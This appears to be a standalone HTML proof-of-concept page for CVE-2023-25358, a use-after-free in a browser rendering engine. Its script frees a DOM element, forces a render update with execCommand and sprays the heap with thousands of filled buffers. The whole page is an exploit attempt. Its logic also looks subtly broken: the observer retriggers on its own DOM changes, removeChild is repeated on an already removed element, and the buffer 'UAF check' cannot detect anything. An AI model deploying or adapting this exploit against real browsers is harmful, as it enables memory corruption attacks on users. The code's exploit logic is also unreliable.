<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CVE-2023-25358 PoC</title>
    <style>
        #victim {
            position: absolute;
            width: 150px;
            height: 150px;
            overflow: hidden;
            background: red;
        }
        #newChild {
            width: 50px;
            height: 50px;
            background: yellow;
        }
        button {
            margin: 15px 0;
            padding: 10px;
            font-size: 16px;
            cursor: pointer;
        }
        #status {
            margin-top: 8px;
            font-weight: bold;
            color: darkred;
        }
    </style>
</head>
<body>
    <h1>CVE-2023-25358: RenderLayer::addChild UAF</h1>
    <p>Click to trigger the PoC. Expect a crash or UAF detection.</p>
    <button id="trigger">Trigger PoC</button>
    <div id="status">Ready...</div>
    <div id="container">
        <div id="victim"></div>
    </div>
    <script>
        const container = document.getElementById('container');
        const victim = document.getElementById('victim');
        const status = document.getElementById('status');
        let attemptCount = 0;

        function sprayHeap() {
            const buffers = [];
            for (let i = 0; i < 12000; i++) {
                const buf = new Uint8Array(4096);
                buf.fill(0x43); // Fill with 'C'
                buffers.push(buf);
            }
            return buffers;
        }

        function triggerExploit() {
            attemptCount++;
            console.log(`Attempt ${attemptCount}: Initiating...`);
            status.textContent = `Attempt ${attemptCount} running...`;

            // Step 1: Remove element to free RenderLayer
            victim.style.display = 'block';
            container.removeChild(victim);

            // Step 2: Add new element and update render tree
            setTimeout(() => {
                try {
                    // Add new child to trigger addChild
                    const newChild = document.createElement('div');
                    newChild.id = 'newChild';
                    newChild.style.width = '50px';
                    newChild.style.height = '50px';
                    newChild.style.background = 'yellow';
                    container.appendChild(newChild);
                    // execCommand to force render tree update
                    document.execCommand('bold', false, null);
                    // Spray heap
                    const buffers = sprayHeap();
                    // Check for UAF
                    console.log('Probing for UAF...');
                    for (let i = 0; i < buffers.length; i++) {
                        if (buffers[i][0] !== 0x43) {
                            console.log(`UAF detected at index ${i}`);
                            status.textContent = 'UAF detected!';
                            return;
                        }
                    }
                    console.log('Exploit attempt done, check for crash.');
                    status.textContent = 'Exploit attempted!';
                } catch (err) {
                    console.error(`Error: ${err.message}`);
                    status.textContent = 'Failed: Error occurred.';
                }
            }, 75);
        }

        const observer = new MutationObserver(() => {
            console.log('DOM modified, retrying exploit...');
            triggerExploit();
        });

        observer.observe(container, { childList: true, subtree: true });

        document.getElementById('trigger').addEventListener('click', () => {
            try {
                triggerExploit();
            } catch (err) {
                console.error(`Error: ${err.message}`);
                status.textContent = 'Failed: Error occurred.';
            }
        });
    </script>
</body>
</html>
